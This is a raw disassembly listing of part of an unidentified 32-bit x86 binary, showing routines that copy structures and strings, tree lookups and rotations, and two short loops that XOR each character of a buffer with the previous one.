   12a5f:	push   esi
   12a60:	push   edi
   12a61:	mov    edi,DWORD PTR [ebp+0x8]
   12a64:	push   edi
   12a65:	mov    esi,ecx
   12a67:	call   0x129cc
   12a6c:	lea    eax,[edi+0x8]
   12a6f:	push   eax
   12a70:	lea    ecx,[esi+0x8]
   12a73:	call   0x129cc
   12a78:	mov    eax,DWORD PTR [edi+0x10]
   12a7b:	mov    DWORD PTR [esi+0x10],eax
   12a7e:	lea    eax,[edi+0x14]
   12a81:	push   eax
   12a82:	lea    ecx,[esi+0x14]
   12a85:	call   0x129cc
   12a8a:	lea    eax,[edi+0x1c]
   12a8d:	push   eax
   12a8e:	lea    ecx,[esi+0x1c]
   12a91:	call   0x129cc
   12a96:	lea    eax,[edi+0x24]
   12a99:	push   eax
   12a9a:	lea    ecx,[esi+0x24]
   12a9d:	call   0x129cc
   12aa2:	mov    eax,DWORD PTR [edi+0x2c]
   12aa5:	mov    DWORD PTR [esi+0x2c],eax
   12aa8:	mov    eax,DWORD PTR [edi+0x30]
   12aab:	mov    DWORD PTR [esi+0x30],eax
   12aae:	mov    eax,DWORD PTR [edi+0x38]
   12ab1:	mov    DWORD PTR [esi+0x38],eax
   12ab4:	mov    eax,DWORD PTR [edi+0x3c]
   12ab7:	mov    DWORD PTR [esi+0x3c],eax
   12aba:	mov    eax,DWORD PTR [edi+0x40]
   12abd:	mov    DWORD PTR [esi+0x40],eax
   12ac0:	mov    eax,DWORD PTR [edi+0x44]
   12ac3:	add    edi,0x48
   12ac6:	push   edi
   12ac7:	lea    ecx,[esi+0x48]
   12aca:	mov    DWORD PTR [esi+0x44],eax
   12acd:	call   0x129cc
   12ad2:	pop    edi
   12ad3:	mov    eax,esi
   12ad5:	pop    esi
   12ad6:	pop    ebp
   12ad7:	ret    0x4
   12ada:	int3   
   12adb:	int3   
   12adc:	int3   
   12add:	int3   
   12ade:	int3   
   12adf:	int3   
   12ae0:	mov    edi,edi
   12ae2:	push   esi
   12ae3:	mov    esi,ecx
   12ae5:	lea    ecx,[esi+0x8]
   12ae8:	call   0x11ece
   12aed:	push   DWORD PTR [esi]
   12aef:	call   0x10a9a
   12af4:	pop    ecx
   12af5:	pop    esi
   12af6:	ret    
   12af7:	int3   
   12af8:	int3   
   12af9:	int3   
   12afa:	int3   
   12afb:	int3   
   12afc:	mov    edi,edi
   12afe:	push   esi
   12aff:	mov    esi,ecx
   12b01:	push   DWORD PTR [esi+0x8]
   12b04:	call   0x10a9a
   12b09:	push   DWORD PTR [esi]
   12b0b:	call   0x10a9a
   12b10:	pop    ecx
   12b11:	pop    ecx
   12b12:	pop    esi
   12b13:	ret    
   12b14:	int3   
   12b15:	int3   
   12b16:	int3   
   12b17:	int3   
   12b18:	int3   
   12b19:	int3   
   12b1a:	mov    edi,edi
   12b1c:	push   ebp
   12b1d:	mov    ebp,esp
   12b1f:	push   esi
   12b20:	push   DWORD PTR [ebp+0xc]
   12b23:	mov    esi,ecx
   12b25:	push   DWORD PTR [ebp+0x8]
   12b28:	call   0x11152
   12b2d:	mov    eax,esi
   12b2f:	pop    esi
   12b30:	pop    ebp
   12b31:	ret    0x8
   12b34:	int3   
   12b35:	int3   
   12b36:	int3   
   12b37:	int3   
   12b38:	int3   
   12b39:	int3   
   12b3a:	mov    edi,edi
   12b3c:	push   ebp
   12b3d:	mov    ebp,esp
   12b3f:	mov    eax,DWORD PTR [ebp+0x8]
   12b42:	push   esi
   12b43:	push   DWORD PTR [eax+0x4]
   12b46:	mov    esi,ecx
   12b48:	push   DWORD PTR [eax]
   12b4a:	call   0x11152
   12b4f:	mov    eax,esi
   12b51:	pop    esi
   12b52:	pop    ebp
   12b53:	ret    0x4
   12b56:	int3   
   12b57:	int3   
   12b58:	int3   
   12b59:	int3   
   12b5a:	int3   
   12b5b:	int3   
   12b5c:	mov    edi,edi
   12b5e:	push   ebp
   12b5f:	mov    ebp,esp
   12b61:	push   ebx
   12b62:	push   esi
   12b63:	push   edi
   12b64:	mov    edi,DWORD PTR [ebp+0x8]
   12b67:	mov    eax,DWORD PTR [edi+0x4]
   12b6a:	mov    esi,ecx
   12b6c:	mov    ebx,DWORD PTR [esi]
   12b6e:	mov    DWORD PTR [esi+0x4],eax
   12b71:	xor    ecx,ecx
   12b73:	push   0x2
   12b75:	inc    eax
   12b76:	pop    edx
   12b77:	mul    edx
   12b79:	seto   cl
   12b7c:	neg    ecx
   12b7e:	or     ecx,eax
   12b80:	push   ecx
   12b81:	call   0x10a66
   12b86:	mov    ecx,DWORD PTR [esi+0x4]
   12b89:	add    ecx,ecx
   12b8b:	push   ecx
   12b8c:	mov    DWORD PTR [esi],eax
   12b8e:	push   DWORD PTR [edi]
   12b90:	push   eax
   12b91:	call   0x1dade
   12b96:	mov    eax,DWORD PTR [esi+0x4]
   12b99:	mov    ecx,DWORD PTR [esi]
   12b9b:	xor    edx,edx
   12b9d:	push   ebx
   12b9e:	mov    WORD PTR [ecx+eax*2],dx
   12ba2:	call   0x10a9a
   12ba7:	add    esp,0x14
   12baa:	pop    edi
   12bab:	mov    eax,esi
   12bad:	pop    esi
   12bae:	pop    ebx
   12baf:	pop    ebp
   12bb0:	ret    0x4
   12bb3:	int3   
   12bb4:	int3   
   12bb5:	int3   
   12bb6:	int3   
   12bb7:	int3   
   12bb8:	mov    edi,edi
   12bba:	push   ebp
   12bbb:	mov    ebp,esp
   12bbd:	push   esi
   12bbe:	mov    esi,DWORD PTR [ebp+0x8]
   12bc1:	lea    eax,[ebp+0xc]
   12bc4:	push   eax
   12bc5:	mov    ecx,esi
   12bc7:	call   0x12b3a
   12bcc:	xor    ecx,ecx
   12bce:	inc    ecx
   12bcf:	cmp    DWORD PTR [esi+0x4],ecx
   12bd2:	jbe    0x12be6
   12bd4:	mov    eax,DWORD PTR [esi]
   12bd6:	lea    eax,[eax+ecx*2]
   12bd9:	mov    dx,WORD PTR [eax-0x2]
   12bdd:	xor    WORD PTR [eax],dx
   12be0:	inc    ecx
   12be1:	cmp    ecx,DWORD PTR [esi+0x4]
   12be4:	jb     0x12bd4
   12be6:	push   DWORD PTR [ebp+0xc]
   12be9:	call   0x10a9a
   12bee:	pop    ecx
   12bef:	mov    eax,esi
   12bf1:	pop    esi
   12bf2:	pop    ebp
   12bf3:	ret    0xc
   12bf6:	int3   
   12bf7:	int3   
   12bf8:	int3   
   12bf9:	int3   
   12bfa:	int3   
   12bfb:	int3   
   12bfc:	mov    edi,edi
   12bfe:	push   ebp
   12bff:	mov    ebp,esp
   12c01:	push   esi
   12c02:	mov    esi,DWORD PTR [ebp+0x8]
   12c05:	lea    eax,[ebp+0xc]
   12c08:	push   eax
   12c09:	mov    ecx,esi
   12c0b:	call   0x129aa
   12c10:	xor    ecx,ecx
   12c12:	inc    ecx
   12c13:	cmp    DWORD PTR [esi+0x4],ecx
   12c16:	jbe    0x12c27
   12c18:	mov    eax,DWORD PTR [esi]
   12c1a:	add    eax,ecx
   12c1c:	mov    dl,BYTE PTR [eax-0x1]
   12c1f:	xor    BYTE PTR [eax],dl
   12c21:	inc    ecx
   12c22:	cmp    ecx,DWORD PTR [esi+0x4]
   12c25:	jb     0x12c18
   12c27:	push   DWORD PTR [ebp+0xc]
   12c2a:	call   0x10a9a
   12c2f:	pop    ecx
   12c30:	mov    eax,esi
   12c32:	pop    esi
   12c33:	pop    ebp
   12c34:	ret    0xc
   12c37:	int3   
   12c38:	int3   
   12c39:	int3   
   12c3a:	int3   
   12c3b:	int3   
   12c3c:	mov    edi,edi
   12c3e:	push   ebp
   12c3f:	mov    ebp,esp
   12c41:	push   esi
   12c42:	push   DWORD PTR [ebp+0x8]
   12c45:	mov    esi,ecx
   12c47:	call   0x129aa
   12c4c:	push   DWORD PTR [ebp+0xc]
   12c4f:	lea    ecx,[esi+0x8]
   12c52:	call   0x129aa
   12c57:	mov    eax,esi
   12c59:	pop    esi
   12c5a:	pop    ebp
   12c5b:	ret    0x8
   12c5e:	int3   
   12c5f:	int3   
   12c60:	int3   
   12c61:	int3   
   12c62:	int3   
   12c63:	int3   
   12c64:	mov    edi,edi
   12c66:	push   ebp
   12c67:	mov    ebp,esp
   12c69:	mov    eax,DWORD PTR [ebp+0x8]
   12c6c:	mov    eax,DWORD PTR [eax]
   12c6e:	push   esi
   12c6f:	push   DWORD PTR [ebp+0xc]
   12c72:	mov    esi,ecx
   12c74:	lea    ecx,[esi+0x4]
   12c77:	mov    DWORD PTR [esi],eax
   12c79:	call   0x11f0c
   12c7e:	mov    eax,esi
   12c80:	pop    esi
   12c81:	pop    ebp
   12c82:	ret    0x8
   12c85:	int3   
   12c86:	int3   
   12c87:	int3   
   12c88:	int3   
   12c89:	int3   
   12c8a:	mov    edi,edi
   12c8c:	push   ebp
   12c8d:	mov    ebp,esp
   12c8f:	push   esi
   12c90:	push   edi
   12c91:	mov    edi,DWORD PTR [ebp+0x8]
   12c94:	push   edi
   12c95:	mov    esi,ecx
   12c97:	call   0x129aa
   12c9c:	lea    eax,[edi+0x8]
   12c9f:	push   eax
   12ca0:	lea    ecx,[esi+0x8]
   12ca3:	call   0x129aa
   12ca8:	mov    eax,DWORD PTR [edi+0x10]
   12cab:	mov    DWORD PTR [esi+0x10],eax
   12cae:	lea    eax,[edi+0x14]
   12cb1:	push   eax
   12cb2:	lea    ecx,[esi+0x14]
   12cb5:	call   0x129aa
   12cba:	lea    eax,[edi+0x1c]
   12cbd:	push   eax
   12cbe:	lea    ecx,[esi+0x1c]
   12cc1:	call   0x129aa
   12cc6:	lea    eax,[edi+0x24]
   12cc9:	push   eax
   12cca:	lea    ecx,[esi+0x24]
   12ccd:	call   0x129aa
   12cd2:	mov    eax,DWORD PTR [edi+0x2c]
   12cd5:	mov    DWORD PTR [esi+0x2c],eax
   12cd8:	mov    eax,DWORD PTR [edi+0x30]
   12cdb:	mov    DWORD PTR [esi+0x30],eax
   12cde:	mov    eax,DWORD PTR [edi+0x38]
   12ce1:	mov    DWORD PTR [esi+0x38],eax
   12ce4:	mov    eax,DWORD PTR [edi+0x3c]
   12ce7:	mov    DWORD PTR [esi+0x3c],eax
   12cea:	mov    eax,DWORD PTR [edi+0x40]
   12ced:	mov    DWORD PTR [esi+0x40],eax
   12cf0:	mov    eax,DWORD PTR [edi+0x44]
   12cf3:	add    edi,0x48
   12cf6:	push   edi
   12cf7:	lea    ecx,[esi+0x48]
   12cfa:	mov    DWORD PTR [esi+0x44],eax
   12cfd:	call   0x129aa
   12d02:	pop    edi
   12d03:	mov    eax,esi
   12d05:	pop    esi
   12d06:	pop    ebp
   12d07:	ret    0x4
   12d0a:	int3   
   12d0b:	int3   
   12d0c:	int3   
   12d0d:	int3   
   12d0e:	int3   
   12d0f:	int3   
   12d10:	mov    edi,edi
   12d12:	push   ebp
   12d13:	mov    ebp,esp
   12d15:	mov    eax,DWORD PTR [ebp+0x8]
   12d18:	mov    edx,DWORD PTR ds:0x7f6d4
   12d1e:	jmp    0x12d22
   12d20:	mov    eax,ecx
   12d22:	mov    ecx,DWORD PTR [eax]
   12d24:	cmp    ecx,edx
   12d26:	jne    0x12d20
   12d28:	pop    ebp
   12d29:	ret    0x4
   12d2c:	int3   
   12d2d:	int3   
   12d2e:	int3   
   12d2f:	int3   
   12d30:	int3   
   12d31:	int3   
   12d32:	mov    edi,edi
   12d34:	push   ebp
   12d35:	mov    ebp,esp
   12d37:	mov    eax,DWORD PTR [ecx+0x4]
   12d3a:	mov    ecx,DWORD PTR [eax+0x4]
   12d3d:	mov    edx,DWORD PTR ds:0x7f6c8
   12d43:	cmp    ecx,edx
   12d45:	je     0x12d60
   12d47:	push   esi
   12d48:	mov    esi,DWORD PTR [ebp+0x8]
   12d4b:	mov    esi,DWORD PTR [esi]
   12d4d:	cmp    DWORD PTR [ecx+0xc],esi
   12d50:	jae    0x12d57
   12d52:	mov    ecx,DWORD PTR [ecx+0x8]
   12d55:	jmp    0x12d5b
   12d57:	mov    eax,ecx
   12d59:	mov    ecx,DWORD PTR [ecx]
   12d5b:	cmp    ecx,edx
   12d5d:	jne    0x12d4d
   12d5f:	pop    esi
   12d60:	pop    ebp
   12d61:	ret    0x4
   12d64:	int3   
   12d65:	int3   
   12d66:	int3   
   12d67:	int3   
   12d68:	int3   
   12d69:	int3   
   12d6a:	mov    edi,edi
   12d6c:	push   ebp
   12d6d:	mov    ebp,esp
   12d6f:	mov    edx,DWORD PTR [ebp+0x8]
   12d72:	mov    eax,DWORD PTR [edx+0x8]
   12d75:	push   esi
   12d76:	mov    esi,DWORD PTR [eax]
   12d78:	mov    DWORD PTR [edx+0x8],esi
   12d7b:	mov    esi,DWORD PTR [eax]
   12d7d:	cmp    esi,DWORD PTR ds:0x7f6c8
   12d83:	je     0x12d88
   12d85:	mov    DWORD PTR [esi+0x4],edx
   12d88:	mov    esi,DWORD PTR [edx+0x4]
   12d8b:	mov    DWORD PTR [eax+0x4],esi
   12d8e:	mov    ecx,DWORD PTR [ecx+0x4]
   12d91:	pop    esi
   12d92:	cmp    edx,DWORD PTR [ecx+0x4]
   12d95:	jne    0x12d9c
   12d97:	mov    DWORD PTR [ecx+0x4],eax
   12d9a:	jmp    0x12daa
   12d9c:	mov    ecx,DWORD PTR [edx+0x4]
   12d9f:	cmp    edx,DWORD PTR [ecx]
   12da1:	jne    0x12da7
   12da3:	mov    DWORD PTR [ecx],eax
   12da5:	jmp    0x12daa
   12da7:	mov    DWORD PTR [ecx+0x8],eax
   12daa:	mov    DWORD PTR [eax],edx
   12dac:	mov    DWORD PTR [edx+0x4],eax
   12daf:	pop    ebp
   12db0:	ret    0x4
   12db3:	int3   
   12db4:	int3   
   12db5:	int3   
   12db6:	int3   
   12db7:	int3   
   12db8:	mov    edi,edi
   12dba:	push   ebp
   12dbb:	mov    ebp,esp
   12dbd:	mov    edx,DWORD PTR [ebp+0x8]
   12dc0:	mov    eax,DWORD PTR [edx]
   12dc2:	push   esi
   12dc3:	mov    esi,DWORD PTR [eax+0x8]
   12dc6:	mov    DWORD PTR [edx],esi
   12dc8:	mov    esi,DWORD PTR [eax+0x8]
   12dcb:	cmp    esi,DWORD PTR ds:0x7f6c8
   12dd1:	je     0x12dd6
   12dd3:	mov    DWORD PTR [esi+0x4],edx
   12dd6:	mov    esi,DWORD PTR [edx+0x4]
   12dd9:	mov    DWORD PTR [eax+0x4],esi
   12ddc:	mov    ecx,DWORD PTR [ecx+0x4]
   12ddf:	pop    esi
   12de0:	cmp    edx,DWORD PTR [ecx+0x4]
   12de3:	jne    0x12dea
   12de5:	mov    DWORD PTR [ecx+0x4],eax
   12de8:	jmp    0x12df9
   12dea:	mov    ecx,DWORD PTR [edx+0x4]
   12ded:	cmp    edx,DWORD PTR [ecx+0x8]
   12df0:	jne    0x12df7
   12df2:	mov    DWORD PTR [ecx+0x8],eax
   12df5:	jmp    0x12df9
   12df7:	mov    DWORD PTR [ecx],eax
   12df9:	mov    DWORD PTR [eax+0x8],edx
   12dfc:	mov    DWORD PTR [edx+0x4],eax
   12dff:	pop    ebp
   12e00:	ret    0x4
   12e03:	int3   
   12e04:	int3   
   12e05:	int3   
   12e06:	int3   
   12e07:	int3   
   12e08:	mov    edi,edi
   12e0a:	push   ebp
   12e0b:	mov    ebp,esp
   12e0d:	mov    eax,DWORD PTR [ecx+0x4]
   12e10:	push   esi
   12e11:	mov    esi,DWORD PTR [eax+0x4]
   12e14:	push   edi
   12e15:	mov    edi,eax
   12e17:	jmp    0x12e32
   12e19:	push   DWORD PTR [ebp+0x8]
   12e1c:	lea    eax,[esi+0x10]
   12e1f:	push   eax
   12e20:	call   0x19804
   12e25:	test   al,al
   12e27:	je     0x12e2e
   12e29:	mov    esi,DWORD PTR [esi+0x8]
   12e2c:	jmp    0x12e32
   12e2e:	mov    edi,esi
   12e30:	mov    esi,DWORD PTR [esi]
   12e32:	cmp    esi,DWORD PTR ds:0x7f6d4
   12e38:	jne    0x12e19
   12e3a:	mov    eax,edi
   12e3c:	pop    edi
   12e3d:	pop    esi
   12e3e:	pop    ebp
   12e3f:	ret    0x4
   12e42:	int3   
   12e43:	int3   
   12e44:	int3   
   12e45:	int3   
   12e46:	int3   
   12e47:	int3   
   12e48:	mov    edi,edi
   12e4a:	push   ebp
   12e4b:	mov    ebp,esp
   12e4d:	mov    eax,DWORD PTR [ecx+0x4]
   12e50:	push   esi
   12e51:	mov    esi,DWORD PTR [eax+0x4]
   12e54:	push   edi
   12e55:	mov    edi,eax
   12e57:	jmp    0x12e72
   12e59:	push   DWORD PTR [ebp+0x8]
   12e5c:	lea    eax,[esi+0xc]
   12e5f:	push   eax
   12e60:	call   0x19804
   12e65:	test   al,al
   12e67:	je     0x12e6e
   12e69:	mov    esi,DWORD PTR [esi+0x8]
   12e6c:	jmp    0x12e72
   12e6e:	mov    edi,esi
   12e70:	mov    esi,DWORD PTR [esi]
   12e72:	cmp    esi,DWORD PTR ds:0x7f6d8
   12e78:	jne    0x12e59
   12e7a:	mov    eax,edi
   12e7c:	pop    edi
   12e7d:	pop    esi
   12e7e:	pop    ebp
   12e7f:	ret    0x4
   12e82:	int3   
   12e83:	int3   
   12e84:	int3   
   12e85:	int3   
   12e86:	int3   
   12e87:	int3   
   12e88:	mov    edi,edi
   12e8a:	push   ebp
   12e8b:	mov    ebp,esp
   12e8d:	mov    eax,DWORD PTR [ecx+0x4]
   12e90:	mov    ecx,DWORD PTR [eax+0x4]
   12e93:	mov    edx,DWORD PTR ds:0x7f6dc
   12e99:	cmp    ecx,edx
   12e9b:	je     0x12eb6
   12e9d:	push   esi
   12e9e:	mov    esi,DWORD PTR [ebp+0x8]
   12ea1:	mov    esi,DWORD PTR [esi]
   12ea3:	cmp    DWORD PTR [ecx+0xc],esi
   12ea6:	jge    0x12ead
   12ea8:	mov    ecx,DWORD PTR [ecx+0x8]
   12eab:	jmp    0x12eb1
   12ead:	mov    eax,ecx
   12eaf:	mov    ecx,DWORD PTR [ecx]
   12eb1:	cmp    ecx,edx
   12eb3:	jne    0x12ea3
   12eb5:	pop    esi
   12eb6:	pop    ebp
   12eb7:	ret    0x4
   12eba:	int3   
   12ebb:	int3   
   12ebc:	int3   
   12ebd:	int3   
   12ebe:	int3   
   12ebf:	int3   
   12ec0:	mov    edi,edi
   12ec2:	push   esi
   12ec3:	mov    esi,ecx
   12ec5:	mov    ecx,DWORD PTR [esi]
   12ec7:	mov    eax,DWORD PTR [ecx+0x8]
   12eca:	cmp    eax,DWORD PTR ds:0x7f6d0
   12ed0:	je     0x12ede
   12ed2:	push   eax
   12ed3:	call   0x11268
   12ed8:	jmp    0x12eed
   12eda:	mov    DWORD PTR [esi],eax
   12edc:	mov    ecx,eax
   12ede:	mov    eax,DWORD PTR [ecx+0x4]
   12ee1:	cmp    ecx,DWORD PTR [eax+0x8]
   12ee4:	je     0x12eda
   12ee6:	mov    ecx,DWORD PTR [esi]
   12ee8:	cmp    DWORD PTR [ecx+0x8],eax
   12eeb:	je     0x12eef
   12eed:	mov    DWORD PTR [esi],eax
   12eef:	pop    esi
   12ef0:	ret    
   12ef1:	int3   
   12ef2:	int3   
   12ef3:	int3   
   12ef4:	int3   
   12ef5:	int3   
   12ef6:	mov    edi,edi
   12ef8:	push   esi
   12ef9:	mov    esi,ecx
   12efb:	mov    ecx,DWORD PTR [esi]
   12efd:	cmp    DWORD PTR [ecx+0x10],0x0
   12f01:	jne    0x12f10
   12f03:	mov    eax,DWORD PTR [ecx+0x4]
   12f06:	cmp    DWORD PTR [eax+0x4],ecx
   12f09:	jne    0x12f10
   12f0b:	mov    eax,DWORD PTR [ecx+0x8]
   12f0e:	jmp    0x12f2d
   12f10:	mov    eax,DWORD PTR [ecx]
   12f12:	cmp    eax,DWORD PTR ds:0x7f6cc
   12f18:	je     0x12f26
   12f1a:	push   eax
   12f1b:	call   0x11202
   12f20:	jmp    0x12f2d
   12f22:	mov    DWORD PTR [esi],eax
   12f24:	mov    ecx,eax
   12f26:	mov    eax,DWORD PTR [ecx+0x4]
   12f29:	cmp    ecx,DWORD PTR [eax]
   12f2b:	je     0x12f22
   12f2d:	mov    DWORD PTR [esi],eax
   12f2f:	pop    esi
   12f30:	ret    
   12f31:	int3   
   12f32:	int3   
   12f33:	int3   
   12f34:	int3   
   12f35:	int3   
   12f36:	mov    edi,edi
   12f38:	push   esi
   12f39:	mov    esi,ecx
   12f3b:	mov    ecx,DWORD PTR [esi]
   12f3d:	mov    eax,DWORD PTR [ecx+0x8]
   12f40:	cmp    eax,DWORD PTR ds:0x7f6cc
   12f46:	je     0x12f54
   12f48:	push   eax
   12f49:	call   0x11224
   12f4e:	jmp    0x12f63
   12f50:	mov    DWORD PTR [esi],eax
   12f52:	mov    ecx,eax
   12f54:	mov    eax,DWORD PTR [ecx+0x4]
   12f57:	cmp    ecx,DWORD PTR [eax+0x8]
   12f5a:	je     0x12f50
   12f5c:	mov    ecx,DWORD PTR [esi]
   12f5e:	cmp    DWORD PTR [ecx+0x8],eax
   12f61:	je     0x12f65
   12f63:	mov    DWORD PTR [esi],eax
   12f65:	pop    esi
   12f66:	ret    
   12f67:	int3   
   12f68:	int3   
   12f69:	int3   
   12f6a:	int3   
   12f6b:	int3   
   12f6c:	mov    edi,edi
   12f6e:	push   ebp
   12f6f:	mov    ebp,esp
   12f71:	mov    edx,DWORD PTR [ebp+0x8]
   12f74:	mov    eax,DWORD PTR [edx+0x8]
   12f77:	push   esi
   12f78:	mov    esi,DWORD PTR [eax]
   12f7a:	mov    DWORD PTR [edx+0x8],esi
   12f7d:	mov    esi,DWORD PTR [eax]
   12f7f:	cmp    esi,DWORD PTR ds:0x7f6cc
   12f85:	je     0x12f8a
   12f87:	mov    DWORD PTR [esi+0x4],edx
   12f8a:	mov    esi,DWORD PTR [edx+0x4]
   12f8d:	mov    DWORD PTR [eax+0x4],esi
   12f90:	mov    ecx,DWORD PTR [ecx+0x4]
   12f93:	pop    esi
   12f94:	cmp    edx,DWORD PTR [ecx+0x4]
   12f97:	jne    0x12f9e
   12f99:	mov    DWORD PTR [ecx+0x4],eax
   12f9c:	jmp    0x12fac
   12f9e:	mov    ecx,DWORD PTR [edx+0x4]
   12fa1:	cmp    edx,DWORD PTR [ecx]
   12fa3:	jne    0x12fa9
   12fa5:	mov    DWORD PTR [ecx],eax
   12fa7:	jmp    0x12fac
   12fa9:	mov    DWORD PTR [ecx+0x8],eax
   12fac:	mov    DWORD PTR [eax],edx
   12fae:	mov    DWORD PTR [edx+0x4],eax
   12fb1:	pop    ebp
   12fb2:	ret    0x4
   12fb5:	int3   
   12fb6:	int3   
   12fb7:	int3   
   12fb8:	int3   
   12fb9:	int3   
   12fba:	mov    edi,edi
   12fbc:	push   ebp
   12fbd:	mov    ebp,esp
   12fbf:	mov    edx,DWORD PTR [ebp+0x8]
   12fc2:	mov    eax,DWORD PTR [edx]
   12fc4:	push   esi
   12fc5:	mov    esi,DWORD PTR [eax+0x8]
   12fc8:	mov    DWORD PTR [edx],esi
   12fca:	mov    esi,DWORD PTR [eax+0x8]
   12fcd:	cmp    esi,DWORD PTR ds:0x7f6cc
   12fd3:	je     0x12fd8
   12fd5:	mov    DWORD PTR [esi+0x4],edx
   12fd8:	mov    esi,DWORD PTR [edx+0x4]
   12fdb:	mov    DWORD PTR [eax+0x4],esi
   12fde:	mov    ecx,DWORD PTR [ecx+0x4]
   12fe1:	pop    esi
   12fe2:	cmp    edx,DWORD PTR [ecx+0x4]
   12fe5:	jne    0x12fec
   12fe7:	mov    DWORD PTR [ecx+0x4],eax
   12fea:	jmp    0x12ffb
   12fec:	mov    ecx,DWORD PTR [edx+0x4]
   12fef:	cmp    edx,DWORD PTR [ecx+0x8]
   12ff2:	jne    0x12ff9
   12ff4:	mov    DWORD PTR [ecx+0x8],eax
   12ff7:	jmp    0x12ffb
   12ff9:	mov    DWORD PTR [ecx],eax
   12ffb:	mov    DWORD PTR [eax+0x8],edx
   12ffe:	mov    DWORD PTR [edx+0x4],eax
   13001:	pop    ebp
   13002:	ret    0x4
   13005:	int3   
   13006:	int3   
   13007:	int3   
   13008:	int3   
   13009:	int3   
   1300a:	mov    edi,edi
   1300c:	push   ebp
   1300d:	mov    ebp,esp
   1300f:	mov    eax,DWORD PTR [ecx+0x4]
   13012:	push   esi
   13013:	mov    esi,DWORD PTR [eax+0x4]
   13016:	push   edi
   13017:	mov    edi,eax
   13019:	jmp    0x13034
   1301b:	push   DWORD PTR [ebp+0x8]
   1301e:	lea    eax,[esi+0x10]
   13021:	push   eax
   13022:	call   0x19804
   13027:	test   al,al
   13029:	je     0x13030
   1302b:	mov    esi,DWORD PTR [esi+0x8]
   1302e:	jmp    0x13034
   13030:	mov    edi,esi
   13032:	mov    esi,DWORD PTR [esi]
   13034:	cmp    esi,DWORD PTR ds:0x7f6d0
   1303a:	jne    0x1301b
   1303c:	mov    eax,edi
   1303e:	pop    edi
   1303f:	pop    esi
   13040:	pop    ebp
   13041:	ret    0x4
   13044:	int3   
   13045:	int3   
   13046:	int3   
   13047:	int3   
   13048:	int3   
   13049:	int3   
   1304a:	mov    edi,edi
   1304c:	push   ebp
   1304d:	mov    ebp,esp
   1304f:	mov    edx,DWORD PTR [ebp+0x8]
   13052:	mov    eax,DWORD PTR [edx+0x8]
   13055:	push   esi
   13056:	mov    esi,DWORD PTR [eax]
   13058:	mov    DWORD PTR [edx+0x8],esi
   1305b:	mov    esi,DWORD PTR [eax]
   1305d:	cmp    esi,DWORD PTR ds:0x7f6d0
   13063:	je     0x13068
   13065:	mov    DWORD PTR [esi+0x4],edx
   13068:	mov    esi,DWORD PTR [edx+0x4]
   1306b:	mov    DWORD PTR [eax+0x4],esi
   1306e:	mov    ecx,DWORD PTR [ecx+0x4]
   13071:	pop    esi
   13072:	cmp    edx,DWORD PTR [ecx+0x4]
   13075:	jne    0x1307c
   13077:	mov    DWORD PTR [ecx+0x4],eax
   1307a:	jmp    0x1308a
   1307c:	mov    ecx,DWORD PTR [edx+0x4]
   1307f:	cmp    edx,DWORD PTR [ecx]
   13081:	jne    0x13087
   13083:	mov    DWORD PTR [ecx],eax
   13085:	jmp    0x1308a
   13087:	mov    DWORD PTR [ecx+0x8],eax
   1308a:	mov    DWORD PTR [eax],edx
   1308c:	mov    DWORD PTR [edx+0x4],eax
   1308f:	pop    ebp
   13090:	ret    0x4
   13093:	int3   
   13094:	int3   
   13095:	int3   
   13096:	int3   
   13097:	int3   
   13098:	mov    edi,edi
   1309a:	push   ebp
   1309b:	mov    ebp,esp
   1309d:	mov    edx,DWORD PTR [ebp+0x8]
   130a0:	mov    eax,DWORD PTR [edx]
   130a2:	push   esi
   130a3:	mov    esi,DWORD PTR [eax+0x8]
   130a6:	mov    DWORD PTR [edx],esi
   130a8:	mov    esi,DWORD PTR [eax+0x8]
   130ab:	cmp    esi,DWORD PTR ds:0x7f6d0
   130b1:	je     0x130b6
   130b3:	mov    DWORD PTR [esi+0x4],edx
   130b6:	mov    esi,DWORD PTR [edx+0x4]
   130b9:	mov    DWORD PTR [eax+0x4],esi
   130bc:	mov    ecx,DWORD PTR [ecx+0x4]
   130bf:	pop    esi
   130c0:	cmp    edx,DWORD PTR [ecx+0x4]
   130c3:	jne    0x130ca
   130c5:	mov    DWORD PTR [ecx+0x4],eax
   130c8:	jmp    0x130d9
   130ca:	mov    ecx,DWORD PTR [edx+0x4]
   130cd:	cmp    edx,DWORD PTR [ecx+0x8]
   130d0:	jne    0x130d7
   130d2:	mov    DWORD PTR [ecx+0x8],eax
   130d5:	jmp    0x130d9
   130d7:	mov    DWORD PTR [ecx],eax
   130d9:	mov    DWORD PTR [eax+0x8],edx
   130dc:	mov    DWORD PTR [edx+0x4],eax
   130df:	pop    ebp
   130e0:	ret    0x4
   130e3:	int3   
   130e4:	int3   
   130e5:	int3   
   130e6:	int3   
   130e7:	int3   
   130e8:	mov    edi,edi
   130ea:	push   ebp
   130eb:	mov    ebp,esp
   130ed:	mov    eax,DWORD PTR [ecx+0x4]
   130f0:	mov    ecx,DWORD PTR [eax+0x4]
   130f3:	mov    edx,DWORD PTR ds:0x7f6c8
   130f9:	cmp    ecx,edx
   130fb:	je     0x13116
   130fd:	push   esi
   130fe:	mov    esi,DWORD PTR [ebp+0x8]
   13101:	mov    esi,DWORD PTR [esi]
   13103:	cmp    esi,DWORD PTR [ecx+0xc]
   13106:	jae    0x1310e
   13108:	mov    eax,ecx
   1310a:	mov    ecx,DWORD PTR [ecx]
   1310c:	jmp    0x13111
   1310e:	mov    ecx,DWORD PTR [ecx+0x8]
   13111:	cmp    ecx,edx
   13113:	jne    0x13103
   13115:	pop    esi
   13116:	pop    ebp
   13117:	ret    0x4
   1311a:	int3   
   1311b:	int3   
   1311c:	int3   
   1311d:	int3   
   1311e:	int3   
   1311f:	int3   
   13120:	mov    edi,edi
   13122:	push   ebp
   13123:	mov    ebp,esp
   13125:	mov    eax,DWORD PTR [ecx+0x4]
   13128:	push   esi
   13129:	mov    esi,DWORD PTR [eax+0x4]
   1312c:	push   edi
   1312d:	mov    edi,eax
   1312f:	jmp    0x1314a
   13131:	lea    eax,[esi+0x10]
   13134:	push   eax
   13135:	push   DWORD PTR [ebp+0x8]
   13138:	call   0x19804
   1313d:	test   al,al
   1313f:	je     0x13147
   13141:	mov    edi,esi
   13143:	mov    esi,DWORD PTR [esi]
   13145:	jmp    0x1314a
   13147:	mov    esi,DWORD PTR [esi+0x8]
   1314a:	cmp    esi,DWORD PTR ds:0x7f6d4
   13150:	jne    0x13131
   13152:	mov    eax,edi
   13154:	pop    edi
   13155:	pop    esi
   13156:	pop    ebp
   13157:	ret    0x4
   1315a:	int3   
   1315b:	int3   
   1315c:	int3   
   1315d:	int3   
   1315e:	int3   
   1315f:	int3   
   13160:	mov    edi,edi
   13162:	push   ebp
